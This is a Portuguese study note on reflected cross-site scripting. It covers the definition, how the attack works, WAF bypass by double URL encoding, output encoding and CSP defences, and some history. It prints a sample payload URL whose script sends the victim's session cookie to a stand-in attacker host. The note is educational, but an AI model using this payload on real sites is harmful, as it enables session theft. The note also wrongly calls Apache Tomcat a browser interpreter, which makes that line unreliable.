---
tags:
  - afinidade/media
  - status/3_incubadora
  - tipo/conceito
  - contexto/dev/cyber/ataque
---
### Cyber_Ataque_XSS_Reflected

#### 1. O Axioma (A Definição Rígida)
**O que é:** O Cross-Site Scripting Refletido (XSS) é uma injeção de Camada 7 instantânea e não persistente, onde um servidor web recebe um script malicioso no input do usuário e o "reflete" imediatamente na resposta HTTP, executando o código no navegador da vítima.

#### 2. A Desconstrução (Mecânica e Pontos de Falha)
*   **Como Funciona:** O atacante forja uma URL que contém o código Javascript destrutivo (geralmente ofuscado) embutido em parâmetros de busca (ex: `?busca=<script>`). Ele induz a vítima a clicar via [[Cyber_Phishing]]. A aplicação web burra renderiza o código no HTML da página. O navegador da vítima acredita que o código pertence ao servidor e o executa.
*   **O Problema que Causa:** O roubo em tempo real do estado do usuário. O script captura tokens JWT, cookies de sessão, ou clona botões para interceptar credenciais diretamente na máquina alvo.
*   **Visão Sênior (Vulnerabilidades/Escala):** A fraqueza letal desse ataque é que ele exige a ação direta do usuário (o clique). A linha de defesa clássica ([[Cyber_Firewall_WAF]]) atua bloqueando a string de ataque na entrada, mas atacantes usam *Double URL Encoding* para burlar a borda. A mitigação arquitetural absoluta baseia-se em neutralizar a saída (*Output Encoding*), convertendo caracteres perigosos (como `<` em `&lt;`), e empregar cabeçalhos restritivos de Content Security Policy (CSP) para proibir a execução de scripts em linha.

#### 3. As Sinapses (Conexões Livres e Interdisciplinares)
O XSS Refletido é um **Feixe de Luz com código Morse atingindo um Espelho**. O servidor web não guarda o feixe; ele atua apenas como o espelho polido. O invasor joga o laser envenenado (A URL de Phishing) no espelho e ele reflete instantaneamente nos olhos de quem estava prestando atenção no reflexo naquele segundo exato (O Cliente clicando no link). Se o usuário não olhar para a luz no momento do disparo, o ataque não existe.

#### 4. Pragmatismo Aplicado (Código e Implementação)
O payload refletido clássico anexado ao fim de uma URL confiável. A página devolve a tag maliciosa e o `fetch` suga o cookie de sessão para o servidor de Comando e Controle (C2) do criminoso nas sombras da execução do navegador:
```html
<!-- Enviado via SMS ou Email para a vítima logada -->
https://www.site-seguro.com.br/busca?termo=<script>fetch('http://atacante-c2.com/log?c='+document.cookie)</script>
````

5. História do Conteúdo

No surgimento da Web Dinâmica (anos 90 e 2000), os desenvolvedores confiavam cegamente que as pessoas usariam as caixas de pesquisa apenas para digitar textos normais. A descoberta de que os interpretadores de navegadores web ([[Infra_Apache_Tomcat]]) executavam indiscriminadamente qualquer coisa entre tags `<script>` levou a uma epidemia global de roubo de cookies, forçando a criação de sanitizadores nativos em frameworks modernos (como o React ou Angular, que já encodam dados por padrão hoje).